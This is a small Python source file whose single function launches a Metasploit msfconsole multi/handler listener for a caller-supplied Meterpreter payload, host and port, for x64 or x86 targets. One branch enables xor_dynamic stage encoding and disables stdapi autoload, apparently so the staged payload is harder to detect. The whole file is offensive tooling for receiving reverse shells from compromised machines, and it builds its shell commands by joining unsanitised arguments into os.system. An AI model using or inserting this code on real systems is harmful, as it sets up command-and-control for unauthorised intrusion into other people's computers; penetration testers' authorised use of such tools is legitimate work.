import os


def RUN_METERPRETER_SCRIPT(ARCHITECTURE, TYPE, PAYLOAD, LHOST, LPORT):
    if ARCHITECTURE == "x64":
        if TYPE == "YES":
            os.system('msfconsole -x "use exploits/multi/handler; set lhost ' + LHOST + '; set lport ' + LPORT + '; set payload ' + PAYLOAD + '; set AutoLoadStdapi false; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; exploit -z"')

        elif TYPE == "NO":
            os.system('msfconsole -x "use exploits/multi/handler; set lhost ' + LHOST + '; set lport ' + LPORT + '; set payload ' + PAYLOAD + '; exploit -z"')

    elif ARCHITECTURE == "x86":
        if TYPE == "YES":
            os.system('msfconsole -x "use exploits/multi/handler; set lhost ' + LHOST + '; set lport ' + LPORT + '; set payload ' + PAYLOAD + '; set AutoLoadStdapi false; set EnableStageEncoding true; set StageEncoder x86/xor_dynamic; exploit -z"')

        elif TYPE == "NO":
            os.system('msfconsole -x "use exploits/multi/handler; set lhost ' + LHOST + '; set lport ' + LPORT + '; set payload ' + PAYLOAD + '; exploit -z"')
